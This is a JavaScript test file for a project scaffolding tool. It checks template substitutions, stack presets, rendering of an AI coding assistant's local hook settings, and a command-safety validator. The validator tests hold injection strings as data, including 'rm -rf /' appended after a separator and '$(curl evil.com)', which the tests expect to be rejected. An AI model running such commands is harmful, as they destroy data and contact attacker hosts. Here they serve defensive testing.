// bin/__tests__/dev-flow-init.test.js
'use strict';

const { test } = require('node:test');
const assert   = require('node:assert/strict');
const fs       = require('fs');
const os       = require('os');
const path     = require('path');

const {
  applySubstitutions,
  getStackPreset,
  renderSettingsLocal,
  isHookCommandSafe,
  STACK_PRESETS,
  NOOP_COMMAND,
} = require('../dev-flow-init.js');

// ─── applySubstitutions ───────────────────────────────────────────────────────

test('applySubstitutions: replaces [Project Name]', () => {
  const result = applySubstitutions('# [Project Name] — Context', {
    projectName: 'MyApp', ownerRole: '', date: '', layers: '',
  });
  assert.equal(result, '# MyApp — Context');
});

test('applySubstitutions: replaces CLAUDE.md role token', () => {
  const result = applySubstitutions('owner: [role — not personal name]', {
    projectName: '', ownerRole: 'Tech Lead', date: '', layers: '',
  });
  assert.equal(result, 'owner: Tech Lead');
});

test('applySubstitutions: replaces TODO.md role token', () => {
  const result = applySubstitutions('[role — e.g. "Tech Lead", "Dev Lead"] here', {
    projectName: '', ownerRole: 'Dev Lead', date: '', layers: '',
  });
  assert.equal(result, 'Dev Lead here');
});

test('applySubstitutions: replaces YYYY-MM-DD', () => {
  const result = applySubstitutions('last_updated: YYYY-MM-DD', {
    projectName: '', ownerRole: '', date: '2026-04-25', layers: '',
  });
  assert.equal(result, 'last_updated: 2026-04-25');
});

test('applySubstitutions: replaces multi-line layer block', () => {
  const tmpl = [
    '> **Layer values** [CUSTOMIZE]',
    "> `[list your stack's layer names — see docs/blueprint/09-customization.md for stack-specific examples]`",
    '> Example — Node/Express: `api, service, repository, middleware, model`',
    '> Example — React/Next.js: `api, hook, component, page, store, infrastructure`',
    '> end',
  ].join('\n');

  const result = applySubstitutions(tmpl, {
    projectName: '', ownerRole: '', date: '', layers: 'api, service, repo',
  });

  assert.ok(result.includes('> `api, service, repo`'), 'layer line present');
  assert.ok(!result.includes('Example —'), 'example lines removed');
  assert.ok(result.includes('> end'), 'content after block preserved');
});

test('applySubstitutions: keeps [CUSTOMIZE] tokens untouched', () => {
  const result = applySubstitutions('[CUSTOMIZE] section header', {
    projectName: '', ownerRole: '', date: '', layers: '',
  });
  assert.equal(result, '[CUSTOMIZE] section header');
});

test('applySubstitutions: unknown placeholder passes through', () => {
  const result = applySubstitutions('[Some Unknown Token]', {
    projectName: '', ownerRole: '', date: '', layers: '',
  });
  assert.equal(result, '[Some Unknown Token]');
});

test('applySubstitutions: replaces multiple occurrences', () => {
  const result = applySubstitutions('[Project Name] and [Project Name]', {
    projectName: 'Acme', ownerRole: '', date: '', layers: '',
  });
  assert.equal(result, 'Acme and Acme');
});

// ─── getStackPreset ───────────────────────────────────────────────────────────

test('getStackPreset: node-express has repository in layers', () => {
  assert.ok(getStackPreset('node-express').layers.includes('repository'));
});

test('getStackPreset: node-express has npm-style lint command', () => {
  assert.equal(getStackPreset('node-express').lintCommand, 'npm run lint');
});

test('getStackPreset: react-next layers include hook', () => {
  assert.ok(getStackPreset('react-next').layers.includes('hook'));
});

test('getStackPreset: python-fastapi uses ruff for lint', () => {
  assert.equal(getStackPreset('python-fastapi').lintCommand, 'ruff check .');
});

test('getStackPreset: python-fastapi uses pip as package manager', () => {
  assert.equal(getStackPreset('python-fastapi').packageManager, 'pip');
});

test('getStackPreset: go-gin uses go vet for lint', () => {
  assert.equal(getStackPreset('go-gin').lintCommand, 'go vet ./...');
});

test('getStackPreset: go-gin uses go build for typecheck', () => {
  assert.equal(getStackPreset('go-gin').typecheckCommand, 'go build ./...');
});

test('getStackPreset: every preset has all four required fields', () => {
  for (const [name, preset] of Object.entries(STACK_PRESETS)) {
    for (const field of ['layers', 'lintCommand', 'typecheckCommand', 'packageManager']) {
      assert.ok(preset[field], `${name}.${field} is set`);
    }
  }
});

test('getStackPreset: custom returns provided values', () => {
  const p = getStackPreset('custom', {
    layers: 'domain, infra',
    lintCommand: 'eslint .',
    typecheckCommand: 'tsc --noEmit',
    packageManager: 'pnpm',
  });
  assert.equal(p.layers, 'domain, infra');
  assert.equal(p.lintCommand, 'eslint .');
  assert.equal(p.typecheckCommand, 'tsc --noEmit');
  assert.equal(p.packageManager, 'pnpm');
});

test('getStackPreset: custom trims whitespace on layers', () => {
  const p = getStackPreset('custom', { layers: '  layers  ' });
  assert.equal(p.layers, 'layers');
});

test('getStackPreset: custom defaults to no-op commands when missing', () => {
  const p = getStackPreset('custom', { layers: 'a' });
  assert.equal(p.lintCommand, NOOP_COMMAND);
  assert.equal(p.typecheckCommand, NOOP_COMMAND);
  assert.equal(p.packageManager, 'npm');
});

test('getStackPreset: unknown preset returns null', () => {
  assert.equal(getStackPreset('unknown-stack'), null);
});

// ─── renderSettingsLocal ──────────────────────────────────────────────────────

function makeTempDir() {
  return fs.mkdtempSync(path.join(os.tmpdir(), 'dfi-test-'));
}

function rmRf(dir) {
  try { fs.rmSync(dir, { recursive: true, force: true }); } catch { /* ignore */ }
}

test('renderSettingsLocal: writes settings.local.json with substituted commands', () => {
  const dir = makeTempDir();
  try {
    const preset = getStackPreset('node-express');
    const result = renderSettingsLocal(dir, preset);
    assert.equal(result.skipped, false);
    const written = JSON.parse(fs.readFileSync(path.join(dir, '.claude', 'settings.local.json'), 'utf8'));
    const allCmds = written.hooks.PreToolUse.flatMap(g => g.hooks.map(h => h.command)).join('\n');
    assert.ok(allCmds.includes('npm run lint'), 'lint command substituted');
    assert.ok(allCmds.includes('npx tsc --noEmit'), 'typecheck command substituted');
    assert.ok(!allCmds.includes('[your-'), 'no placeholder remains');
  } finally {
    rmRf(dir);
  }
});

test('renderSettingsLocal: substitutes [package-manager] in permissions allowlist', () => {
  const dir = makeTempDir();
  try {
    const preset = getStackPreset('python-fastapi');
    renderSettingsLocal(dir, preset);
    const written = JSON.parse(fs.readFileSync(path.join(dir, '.claude', 'settings.local.json'), 'utf8'));
    const allowlist = written.permissions.allow.join(' ');
    assert.ok(allowlist.includes('pip'), 'package-manager substituted in allowlist');
    assert.ok(!allowlist.includes('[package-manager]'), 'no placeholder remains');
  } finally {
    rmRf(dir);
  }
});

test('renderSettingsLocal: strips _instructions block from rendered output', () => {
  const dir = makeTempDir();
  try {
    renderSettingsLocal(dir, getStackPreset('node-express'));
    const written = JSON.parse(fs.readFileSync(path.join(dir, '.claude', 'settings.local.json'), 'utf8'));
    assert.equal(written._instructions, undefined);
  } finally {
    rmRf(dir);
  }
});

// ─── isHookCommandSafe ────────────────────────────────────────────────────────

test('isHookCommandSafe: accepts plain lint commands', () => {
  assert.equal(isHookCommandSafe('npm run lint'), true);
  assert.equal(isHookCommandSafe('npx tsc --noEmit'), true);
  assert.equal(isHookCommandSafe('go vet ./...'), true);
});

test('isHookCommandSafe: accepts && and || chaining', () => {
  assert.equal(isHookCommandSafe('npm run lint && npx tsc --noEmit'), true);
  assert.equal(isHookCommandSafe('npm run lint || true'), true);
});

test('isHookCommandSafe: rejects semicolon (command separator)', () => {
  assert.equal(isHookCommandSafe('npm run lint; rm -rf /'), false);
});

test('isHookCommandSafe: rejects newline', () => {
  assert.equal(isHookCommandSafe('npm run lint\nrm -rf /'), false);
});

test('isHookCommandSafe: rejects backtick command substitution', () => {
  assert.equal(isHookCommandSafe('npm run `whoami`'), false);
});

test('isHookCommandSafe: rejects $() command substitution', () => {
  assert.equal(isHookCommandSafe('npm run $(curl evil.com)'), false);
});

test('isHookCommandSafe: rejects empty / non-string', () => {
  assert.equal(isHookCommandSafe(''), false);
  assert.equal(isHookCommandSafe(null), false);
  assert.equal(isHookCommandSafe(undefined), false);
});

test('renderSettingsLocal: preserves existing settings.local.json — writes .new', () => {
  const dir = makeTempDir();
  try {
    fs.mkdirSync(path.join(dir, '.claude'), { recursive: true });
    const existingPath = path.join(dir, '.claude', 'settings.local.json');
    fs.writeFileSync(existingPath, '{"existing":true}');
    const result = renderSettingsLocal(dir, getStackPreset('node-express'));
    assert.equal(result.preserved, existingPath);
    assert.ok(fs.existsSync(existingPath + '.new'), '.new file written');
    const original = JSON.parse(fs.readFileSync(existingPath, 'utf8'));
    assert.equal(original.existing, true, 'existing file untouched');
  } finally {
    rmRf(dir);
  }
});
